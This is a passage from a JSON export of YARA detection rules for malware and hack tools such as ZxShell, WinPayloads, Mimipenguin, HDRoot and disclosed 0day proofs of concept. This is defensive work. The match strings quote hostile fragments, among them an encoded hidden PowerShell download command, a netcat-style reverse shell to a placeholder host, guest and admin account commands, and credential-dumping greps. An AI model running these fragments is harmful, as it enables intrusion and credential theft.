relation","minimum_yara":"1.7","name":"Unspecified_Malware_Jul17_2C_RID316E","reference":"https://goo.gl/CX3KaY","required_modules":[],"rule_hash":"3cb5ffb17f3800d93b233d594f536514","score":75,"tags":["DEMO","EXE","T1047","FILE","MAL"]},{"author":"Florian Roth","content":"rule POSHSPY_Malware_RID2C6F : DEMO MAL {\n   meta:\n      description = \"Detects\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"\n      date = \"2017-07-15 09:49:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"function sWP($cN, $pN, $aK, $aI)\" fullword ascii\n      $x2 = \"$aeK = [byte[]] (0x69, 0x87, 0x0b, 0xf2\" ascii\n      $x3 = \"(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len',\" \n      $x4 = \"$cPairKey = \\\"BwIAAACkAABSU0EyAAQAAAEAA\" \n      $x5 = \"$exeRes = exePldRoutine\" \n      $x6 = \"ZgB1AG4AYwB0AGkAbwBuACAAcAB1AHIAZgBDAHIA\" \n   condition: \n      1 of them\n}","date":"2017-07-15 09:49:01","description":"Detects","minimum_yara":"1.7","name":"POSHSPY_Malware_RID2C6F","reference":"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html","required_modules":[],"rule_hash":"292ea6f1302c1c620e5ffaf985a42971","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule CHAOS_Payload_RID2BA8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a CHAOS back connect payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/tiagorlampert/CHAOS\"\n      date = \"2017-07-15 09:15:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = { 2F 43 48 41 4F 53 00 02 73 79 6E 63 2F 61 74 6F 6D 69 63 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )\n}","date":"2017-07-15 09:15:51","description":"Detects a CHAOS back connect payload","minimum_yara":"1.7","name":"CHAOS_Payload_RID2BA8","reference":"https://github.com/tiagorlampert/CHAOS","required_modules":[],"rule_hash":"0c72ad990063eb233e99e87093e91aff","score":80,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SecurityXploded_Producer_String_RID33B2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects hacktools by SecurityXploded\"\n      author = \"Florian Roth\"\n      reference = \"http://securityxploded.com/browser-password-dump.php\"\n      date = \"2017-07-13 14:58:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http://securityxploded.com\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and all of them )\n}","date":"2017-07-13 14:58:51","description":"Detects hacktools by SecurityXploded","minimum_yara":"1.7","name":"SecurityXploded_Producer_String_RID33B2","reference":"http://securityxploded.com/browser-password-dump.php","required_modules":[],"rule_hash":"4476c6ab666e84e049501aa47fa16e59","score":60,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WinPayloads_Payload_RID2EA5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects WinPayloads Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/Winpayloads\"\n      date = \"2017-07-11 11:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpayload.exe.manifest\" fullword ascii\n      $s2 = \"spayload\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and all of them )\n}","date":"2017-07-11 11:23:21","description":"Detects WinPayloads Payload","minimum_yara":"1.7","name":"WinPayloads_Payload_RID2EA5","reference":"https://github.com/nccgroup/Winpayloads","required_modules":[],"rule_hash":"e8b4e9185dec26768880712bf7656203","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WinPayloads_PowerShell_RID2FE0 : DEMO HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects WinPayloads PowerShell Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nccgroup/Winpayloads\"\n      date = \"2017-07-11 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHBqCCA9AwggPMAgEAMIIDxQYJKoZIhvcNAQcBMBwGCiqGSIb3D\" ascii\n      $x2 = \"powershell -w hidden -noni -enc SQBF\" fullword ascii nocase\n      $x3 = \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA\" ascii\n      $x4 = \"powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA\" ascii\n   condition: \n      filesize < 10KB and 1 of them\n}","date":"2017-07-11 12:15:51","description":"Detects WinPayloads PowerShell Payload","minimum_yara":"1.7","name":"WinPayloads_PowerShell_RID2FE0","reference":"https://github.com/nccgroup/Winpayloads","required_modules":[],"rule_hash":"5a94c96abf12debc7daef552562f9186","score":75,"tags":["DEMO","T1086","SCRIPT","HKTL"]},{"author":"Florian Roth","content":"rule Gen_Net_LocalGroup_Administrators_Add_Command_RID38C1 : DEMO EXE FILE GEN SUSP {\n   meta:\n      description = \"Detects an executable that contains a command to add a user account to the local administrators group\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-07-08 18:34:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = /net localgroup administrators [a-zA-Z0-9]{1,16} \\/add/ nocase ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}","date":"2017-07-08 18:34:41","description":"Detects an executable that contains a command to add a user account to the local administrators group","minimum_yara":"1.7","name":"Gen_Net_LocalGroup_Administrators_Add_Command_RID38C1","reference":"Internal Research","required_modules":[],"rule_hash":"06a366ba8169c06fe9434f20e760146a","score":75,"tags":["SUSP","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule mimipenguin_1_RID2C43 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Mimipenguin hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-07-08 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"self._strings_dump += strings(dump_process(target_pid))\" fullword ascii\n      $x2 = \"def _dump_target_processes(self):\" fullword ascii\n      $x3 = \"self._target_processes = ['sshd:']\" fullword ascii\n      $x4 = \"GnomeKeyringPasswordFinder()\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )\n}","date":"2017-07-08 09:41:41","description":"Detects Mimipenguin hack tool","minimum_yara":"1.7","name":"mimipenguin_1_RID2C43","reference":"https://github.com/huntergregal/mimipenguin","required_modules":[],"rule_hash":"0181089749930a9d85b7ddb04aaf9725","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule mimipenguin_2_RID2C44 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects Mimipenguin hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-07-08 09:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DUMP=$(strings \\\"/tmp/dump.${pid}\\\" | grep -E\" fullword ascii\n      $x2 = \"strings /tmp/apache* | grep -E '^Authorization: Basic.+=$'\" fullword ascii\n      $x3 = \"grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A\" fullword ascii\n      $x4 = \"strings \\\"/tmp/dump.${pid}\\\" | grep -E -m 1 '^\\\\$.\\\\$.+\\\\$')\\\"\" fullword ascii\n      $x5 = \"if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )\n}","date":"2017-07-08 09:41:51","description":"Detects Mimipenguin hack tool","minimum_yara":"1.7","name":"mimipenguin_2_RID2C44","reference":"https://github.com/huntergregal/mimipenguin","required_modules":[],"rule_hash":"b7942816b5ae00188294101a6ec11d78","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ZxShell_Related_Malware_CN_Group_Jul17_1_RID3601 : APT DEMO EXE FILE MAL T1050 T1087 {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CMD.EXE /C NET USER GUEST /ACTIVE:yes && NET USER GUEST ++++++\" ascii\n      $x2 = \"system\\\\cURRENTcONTROLSET\\\\sERVICES\\\\tERMSERVICE\" fullword ascii\n      $x3 = \"\\\\secivreS\\\\teSlortnoCtnerruC\\\\METSYS\" fullword ascii\n      $x4 = \"system\\\\cURRENTCONTROLSET\\\\cONTROL\\\\tERMINAL sERVER\" fullword ascii\n      $x5 = \"sOFTWARE\\\\mICROSOFT\\\\iNTERNET eXPLORER\\\\mAIN\" fullword ascii\n      $x6 = \"eNABLEaDMINtsREMOTE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )\n}","date":"2017-07-08 16:37:21","description":"Detects a ZxShell related sample from a CN threat group","minimum_yara":"1.7","name":"ZxShell_Related_Malware_CN_Group_Jul17_1_RID3601","reference":"https://blogs.rsa.com/cat-phishing/","required_modules":[],"rule_hash":"f2b44d07a0b6c373f9951254481ecfff","score":75,"tags":["T1050","T1087","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule ZxShell_Related_Malware_CN_Group_Jul17_2_RID3602 : APT DEMO EXE FILE MAL T1077 {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1077\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $u1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\" fullword ascii\n      $u2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n      $u3 = \"User-Agent:Mozilla/5.0 (X11; U; Linux i686; en-US; re:1.4.0) Gecko/20080808 Firefox/%d.0\" fullword ascii\n      $u4 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n      $x1 = \"\\\\\\\\%s\\\\admin$\\\\g1fd.exe\" fullword ascii\n      $x2 = \"C:\\\\g1fd.exe\" fullword ascii\n      $x3 = \"\\\\\\\\%s\\\\C$\\\\NewArean.exe\" fullword ascii\n      $s0 = \"at \\\\\\\\%s %d:%d %s\" fullword ascii\n      $s1 = \"%c%c%c%c%ccn.exe\" fullword ascii\n      $s2 = \"hra%u.dll\" fullword ascii\n      $s3 = \"Referer: http://%s:80/http://%s\" fullword ascii\n      $s5 = \"Accept-Language: zh-cn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2017-07-08 16:37:31","description":"Detects a ZxShell related sample from a CN threat group","minimum_yara":"1.7","name":"ZxShell_Related_Malware_CN_Group_Jul17_2_RID3602","reference":"https://blogs.rsa.com/cat-phishing/","required_modules":[],"rule_hash":"dd08b6b16c23daef88f18ba2b8dd4bd9","score":75,"tags":["T1077","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule ZxShell_Related_Malware_CN_Group_Jul17_3_RID3603 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a ZxShell related sample from a CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 16:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\nt%s.dll\" fullword ascii\n      $s2 = \"RegQueryValueEx(Svchost\\\\netsvcs)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}","date":"2017-07-08 16:37:41","description":"Detects a ZxShell related sample from a CN threat group","minimum_yara":"1.7","name":"ZxShell_Related_Malware_CN_Group_Jul17_3_RID3603","reference":"https://blogs.rsa.com/cat-phishing/","required_modules":[],"rule_hash":"30989b54ed29b1db81ea655e983445b7","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ZxShell_Jul17_RID2BCD : APT DEMO T1007 {\n   meta:\n      description = \"Detects a ZxShell - CN threat group\"\n      author = \"Florian Roth\"\n      reference = \"https://blogs.rsa.com/cat-phishing/\"\n      date = \"2017-07-08 09:22:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"zxplug -add\" fullword ascii\n      $x2 = \"getxxx c:\\\\xyz.dll\" fullword ascii\n      $x3 = \"downfile -d c:\\\\windows\\\\update.exe\" fullword ascii\n      $x4 = \"-fromurl http://x.x.x/x.dll\" fullword ascii\n      $x5 = \"ping 127.0.0.1 -n 7&cmd.exe /c net start %s\" fullword ascii\n      $x6 = \"ZXNC -e cmd.exe x.x.x.x\" fullword ascii\n      $x7 = \"(bind a cmdshell)\" fullword ascii\n      $x8 = \"ZXFtpServer 21 20 zx\" fullword ascii\n      $x9 = \"ZXHttpServer\" fullword ascii\n      $x10 = \"c:\\\\error.htm,.exe|c:\\\\a.exe,.zip|c:\\\\b.zip\\\"\" fullword ascii\n      $x11 = \"c:\\\\windows\\\\clipboardlog.txt\" fullword ascii\n      $x12 = \"AntiSniff -a wireshark.exe\" fullword ascii\n      $x13 = \"c:\\\\windows\\\\keylog.txt\" fullword ascii\n   condition: \n      ( filesize < 10000KB and 1 of them ) or 3 of them\n}","date":"2017-07-08 09:22:01","description":"Detects a ZxShell - CN threat group","minimum_yara":"1.7","name":"ZxShell_Jul17_RID2BCD","reference":"https://blogs.rsa.com/cat-phishing/","required_modules":[],"rule_hash":"960b51abe999993e2f37b97c00aab61c","score":75,"tags":["APT","DEMO","T1007"]},{"author":"Florian Roth","content":"rule HDRoot_Sample_Jul17_1_RID2E84 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects HDRoot samples\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 11:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"gleupdate.dll\" fullword ascii\n      $s2 = \"\\\\DosDevices\\\\%ws\\\\system32\\\\%ws\" fullword wide\n      $s3 = \"l\\\\Driver\\\\nsiproxy\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them )\n}","date":"2017-07-07 11:17:51","description":"Detects HDRoot samples","minimum_yara":"1.7","name":"HDRoot_Sample_Jul17_1_RID2E84","reference":"Winnti HDRoot VT","required_modules":[],"rule_hash":"2e89ba094176dfd224547ad52eef782e","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule HDRoot_Sample_Jul17_2_RID2E85 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects HDRoot samples\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http://microsoftcompanywork.htm\" fullword ascii\n      $x2 = \"compose.aspx?s=%4X%4X%4X%4X%4X%4X\" fullword ascii\n      $t1 = \"http://babelfish.yahoo.com/translate_url?\" fullword ascii\n      $t2 = \"http://translate.google.com/translate?prev=hp&hl=en&js=n&u=%s?%d&sl=es&tl=en\" fullword ascii\n      $u1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.5.\" ascii\n      $u2 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)\" fullword ascii\n      $u3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; TERA:\" fullword ascii\n      $s1 = \"\\\\system32\\\\ntoskrnl.exe\" fullword ascii\n      $s2 = \"Schedsvc.dll\" fullword wide\n      $s3 = \"dllserver64.dll\" fullword ascii\n      $s4 = \"C:\\\\TERA_SR.txt\" fullword ascii\n      $s5 = \"updatevnsc.dat\" fullword wide\n      $s6 = \"tera dll service global event\" fullword ascii\n      $s7 = \"Referer: http://%s/%s\" fullword ascii\n      $s8 = \"tera replace dll config\" fullword ascii\n      $s9 = \"SetupDll64.dll\" fullword ascii\n      $s10 = \"copy %%ComSpec%% \\\"%s\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 1 of ( $x* ) or all of ( $u* ) or 8 of them )\n}","date":"2017-07-07 11:18:01","description":"Detects HDRoot samples","minimum_yara":"1.7","name":"HDRoot_Sample_Jul17_2_RID2E85","reference":"Winnti HDRoot VT","required_modules":[],"rule_hash":"e90415ce1c4c1ac4680211d436b48054","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Jul17_1A_RID316B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects samples of an unspecified malware - July 2017\"\n      author = \"Florian Roth\"\n      reference = \"Winnti HDRoot VT\"\n      date = \"2017-07-07 13:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\wuauserv.dll\" fullword ascii\n      $s2 = \"systemroot%\\\\system32\\\\wuauserv.dll\" fullword ascii\n      $s3 = \"ocgen.logIN\" fullword wide\n      $s4 = \"ocmsn.logIN\" fullword wide\n      $s5 = \"Install.log\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )\n}","date":"2017-07-07 13:21:41","description":"Detects samples of an unspecified malware - July 2017","minimum_yara":"1.7","name":"Unspecified_Malware_Jul17_1A_RID316B","reference":"Winnti HDRoot VT","required_modules":[],"rule_hash":"fe9788d0c0d535d06769cd625a8a6548","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_shellcodegenerator_RID3605 : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 16:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\shellcodegenerator.pdb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}","date":"2017-07-07 16:38:01","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_shellcodegenerator_RID3605","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"d2e46d9a7e3e67b0c92b076af823b794","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_lpe_RID2FCC : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"msiexec /f c:\\\\users\\\\%username%\\\\downloads\\\\\" fullword ascii\n      $x2 = \"c:\\\\users\\\\%username%\\\\downloads\\\\bat.bat\" fullword ascii\n      $x3 = \"\\\\payload.msi /quiet\" ascii\n      $x4 = \"\\\\payload2\\\\WindowsTrustedRTProxy.sys\" fullword wide\n      $x5 = \"\\\\payload2\" fullword wide\n      $x6 = \"\\\\payload\" fullword wide\n      $x7 = \"WindowsTrustedRTProxy.sys /grant:r administrators:RX\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them )\n}","date":"2017-07-07 12:12:31","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_lpe_RID2FCC","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"daf7f29073ea3c2cb8c18403e9345790","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_exploit_RID3190 : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:27:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\exploit.pdb\" ascii\n      $x2 = \"\\\\favorites\\\\stolendata.txt\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-07-07 13:27:51","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_exploit_RID3190","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"ab9c0a5da96179e02861c7ec580ff7f3","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_InjectDll_RID3204 : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\InjectDll.pdb\" fullword ascii\n      $x2 = \"Specify -l to list all IE processes running in the current session\" fullword ascii\n      $x3 = \"Usage: InjectDll -l|pid PathToDll\" fullword ascii\n      $x4 = \"Injecting DLL: %ls into PID: %d\" fullword ascii\n      $x5 = \"Error adjusting privilege %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-07-07 13:47:11","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_InjectDll_RID3204","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"71df2c5acf52c49393584fcedae2afe8","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_payload_MSI_RID32BD : DEMO EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 14:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WShell32.dll\" fullword wide\n      $s2 = \"Target empty, so account name translation begins on the local system.\" fullword wide\n      $s3 = \"\\\\custact\\\\x86\\\\AICustAct.pdb\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 1000KB and all of them )\n}","date":"2017-07-07 14:18:01","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_payload_MSI_RID32BD","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"c200000f11f46c9b86319c7010c30465","score":75,"tags":["EXPLOIT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_injector_RID31E9 : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 13:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\injector.pdb\" ascii\n      $x2 = \"Cannot write the shellcode in the process memory, error: \" fullword ascii\n      $x3 = \"/s shellcode_file PID: shellcode injection.\" fullword ascii\n      $x4 = \"/d dll_file PID: dll injection via LoadLibrary().\" fullword ascii\n      $x5 = \"/s shellcode_file PID\" fullword ascii\n      $x6 = \"Shellcode copied in memory: OK\" fullword ascii\n      $x7 = \"Usage of the injector. \" fullword ascii\n      $x8 = \"KO: cannot obtain the SeDebug privilege.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them\n}","date":"2017-07-07 13:42:41","description":"Detects POC code from disclosed 0day hacktool set","minimum_yara":"1.7","name":"Disclosed_0day_POCs_injector_RID31E9","reference":"Disclosed 0day Repos","required_modules":[],"rule_hash":"dabae5526b4e238ab1fd3763dfb9e36f","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Disclosed_0day_POCs_lpe_2_RID305D : DEMO EXE EXPLOIT FILE HKTL {\n   meta:\n      description = \"Detects POC code from disclosed 0day hacktool set\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed 0day Repos\"\n      date = \"2017-07-07 12:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\cmd.exe\\\" /k wusa c:\\\\users\\\\\" ascii\n      $s2 = \"D:\\\\gitpoc\\\\UAC\\\\src\\\\x64\\\\Release\\\\lpe.pdb\" fullword ascii\n      $s3 = \"Folder Created: \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them )\n}","date":"2017-07-07 